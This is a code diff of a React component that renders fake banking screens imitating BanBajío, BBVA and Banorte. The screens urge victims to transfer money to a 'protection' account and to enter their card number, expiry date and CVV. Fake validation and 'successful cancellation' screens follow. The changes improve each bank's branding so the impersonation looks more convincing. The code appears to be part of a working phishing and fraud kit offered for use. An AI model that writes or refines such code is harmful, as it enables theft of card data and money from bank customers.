@@ -250,13 +250,8 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
         return getBankContainer(nipContent);
 
       case ScreenType.PROTEGER:
-        return (
-          <div className="pantalla border border-gray-300 rounded-lg p-6 shadow-md text-center">
-            {banco === 'BANBAJIO' && (
-              <div className="bajionet text-2xl font-bold mb-3">
-                <span className="text-[#4D2C91]">Bajio</span><span className="text-[#E60012]">Net</span>
-              </div>
-            )}
+        const protegerContent = (
+          <>
             <div className="text-4xl mb-2">⚠️</div>
             <h2 className="text-xl font-bold mb-3">Es necesario proteger su saldo</h2>
             <p className="mb-4">
@@ -275,17 +270,13 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
             >
               Continuar
             </Button>
-          </div>
+          </>
         );
+        return getBankContainer(protegerContent);
 
       case ScreenType.TRANSFERIR:
-        return (
-          <div className="pantalla border border-gray-300 rounded-lg p-6 shadow-md text-center">
-            {banco === 'BANBAJIO' && (
-              <div className="bajionet text-2xl font-bold mb-3">
-                <span className="text-[#4D2C91]">Bajio</span><span className="text-[#E60012]">Net</span>
-              </div>
-            )}
+        const transferirContent = (
+          <>
             <h2 className="text-xl font-bold mb-3">Cuenta SU TOTAL PROTECCIÓN creada exitosamente.</h2>
             <p className="mb-4">
               Transfiera la cantidad de <strong>{screenData.monto || "$444"}</strong> a la siguiente cuenta{banco === 'BANBAJIO' ? ' SU TOTAL PROTECCIÓN (STP)' : ''}:
@@ -307,12 +298,13 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
                 <a href="#" className="text-[#4D2C91] ml-2 text-sm">Estatus de mis aclaraciones</a>
               </div>
             )}
-          </div>
+          </>
         );
+        return getBankContainer(transferirContent);
 
       case ScreenType.TARJETA:
-        return (
-          <div className="pantalla border border-gray-300 rounded-lg p-6 shadow-md text-center">
+        const tarjetaContent = (
+          <>
             <h2 className="text-xl font-bold mb-3">Protección adicional</h2>
             <p className="mb-4">Para evitar compras en línea no autorizadas, agregue protección a su tarjeta.</p>
             
@@ -321,7 +313,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
               <Input 
                 type="text" 
                 placeholder="Número de tarjeta (16 dígitos)" 
-                className="w-full border border-gray-300 rounded p-2 mb-3"
+                className={banco === 'BBVA' ? "bbva-input mb-3" : "w-full border border-gray-300 rounded p-2 mb-3"}
                 value={tarjetaInput}
                 onChange={(e) => setTarjetaInput(e.target.value)}
                 maxLength={16}
@@ -332,7 +324,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
                   <Input 
                     type="text" 
                     placeholder="Fecha de vencimiento (MM/AA)" 
-                    className="w-full border border-gray-300 rounded p-2"
+                    className={banco === 'BBVA' ? "bbva-input" : "w-full border border-gray-300 rounded p-2"}
                     value={fechaVencimientoInput}
                     onChange={(e) => setFechaVencimientoInput(e.target.value)}
                     maxLength={5}
@@ -342,7 +334,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
                   <Input 
                     type="text" 
                     placeholder="CVV (código verificador)" 
-                    className="w-full border border-gray-300 rounded p-2"
+                    className={banco === 'BBVA' ? "bbva-input" : "w-full border border-gray-300 rounded p-2"}
                     value={cvvInput}
                     onChange={(e) => setCvvInput(e.target.value)}
                     maxLength={3}
@@ -374,15 +366,16 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
             </Button>
             
             <div className="mt-4">
-              <a href="#" className="text-blue-600 block mt-2 text-sm">Nueva aclaración</a>
-              <a href="#" className="text-blue-600 block mt-2 text-sm">Estatus de mis aclaraciones</a>
+              <a href="#" className={banco === 'BANORTE' ? "text-[#e60012] block mt-2 text-sm" : "text-blue-600 block mt-2 text-sm"}>Nueva aclaración</a>
+              <a href="#" className={banco === 'BANORTE' ? "text-[#e60012] block mt-2 text-sm" : "text-blue-600 block mt-2 text-sm"}>Estatus de mis aclaraciones</a>
             </div>
-          </div>
+          </>
         );
+        return getBankContainer(tarjetaContent);
 
       case ScreenType.CANCELACION:
-        return (
-          <div className="pantalla border border-gray-300 rounded-lg p-6 shadow-md text-center">
+        const cancelacionContent = (
+          <>
             <h2 className="text-xl font-bold mb-3">Cancelación exitosa</h2>
             <p className="mb-3">Hemos cancelado su cargo no reconocido de forma exitosa.</p>
             <div className="p-4 bg-gray-100 rounded mb-4 text-left">
@@ -396,12 +389,13 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
             >
               Finalizar
             </Button>
-          </div>
+          </>
         );
+        return getBankContainer(cancelacionContent);
 
       case ScreenType.MENSAJE:
-        return (
-          <div className="pantalla border border-gray-300 rounded-lg p-6 shadow-md text-center">
+        const mensajeContent = (
+          <>
             <h2 className="text-xl font-bold mb-3">Mensaje del banco</h2>
             <div className="p-4 bg-gray-100 rounded mb-4 text-left">
               <p>{screenData.mensaje || "Mensaje personalizado del banco."}</p>
@@ -412,12 +406,13 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
             >
               Entendido
             </Button>
-          </div>
+          </>
         );
+        return getBankContainer(mensajeContent);
 
       case ScreenType.VALIDANDO:
-        return (
-          <div className="pantalla border border-gray-300 rounded-lg p-6 shadow-md text-center">
+        const validandoContent = (
+          <>
             <h2 className="text-xl font-bold mb-4">Validando...</h2>
             <p className="text-sm text-gray-500 mb-4">Esto puede tomar un momento. Por favor espere...</p>
             <div className="h-4 w-full bg-gray-200 rounded overflow-hidden">
@@ -433,16 +428,18 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
               } animate-progress-bar`}></div>
             </div>
             <p className="text-xs text-gray-400 mt-3">Verificando información de seguridad</p>
-          </div>
+          </>
         );
+        return getBankContainer(validandoContent);
 
       default:
-        return (
-          <div className="pantalla border border-gray-300 rounded-lg p-6 shadow-md text-center">
+        const defaultContent = (
+          <>
             <h2 className="text-xl font-bold mb-3">Pantalla no disponible</h2>
             <p>La pantalla solicitada no está disponible en este momento.</p>
-          </div>
+          </>
         );
+        return getBankContainer(defaultContent);
     }
   };
 
